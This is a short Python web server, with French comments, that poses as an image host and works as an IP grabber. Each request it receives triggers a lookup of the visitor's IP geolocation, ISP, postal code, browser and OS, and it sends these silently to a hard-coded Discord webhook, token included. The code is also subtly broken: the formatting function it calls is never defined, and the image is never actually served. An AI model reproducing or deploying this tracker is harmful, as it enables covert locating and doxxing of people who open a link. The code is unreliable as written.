from http.server import BaseHTTPRequestHandler
import httpx, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1504428591444787270/PQIj4zyEKb4260Y5EuusqPnmX9wqAFTKqwey5i1LHgUiPSbO4ua1-QDYYZnj2OoJj4Sf'

bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Traitement de l'image et données ici...
        
        data = bindata  # L'image originale ou modifiée
        useragent = self.headers.get('user-agent') or 'No User Agent Found'
        os, browser = httpagentparser.simple_detect(useragent)
        
        ipInfo = httpx.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json()
        
        # Préparation du payload pour Discord
        embed = formatHook(
            ip=ipInfo['ip'],
            city=ipInfo['city'],
            reg=ipInfo['region'],
            country=ipInfo['country'],
            loc=ipInfo['loc'],
            org=ipInfo['org'],
            postal=ipInfo['postal'],
            useragent=useragent,
            os=os,
            browser=browser
        )
        
        # Envoi de l'image et des données à Discord via webhook
        httpx.post(webhook, json=embed)
        
        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    from http.server import HTTPServer
    server_address = ('localhost', 8000)
    print("Starting the server on port 8000...")
    httpd = HTTPServer(server_address, handler)
    print("Server up and listening.")
    httpd.serve_forever()
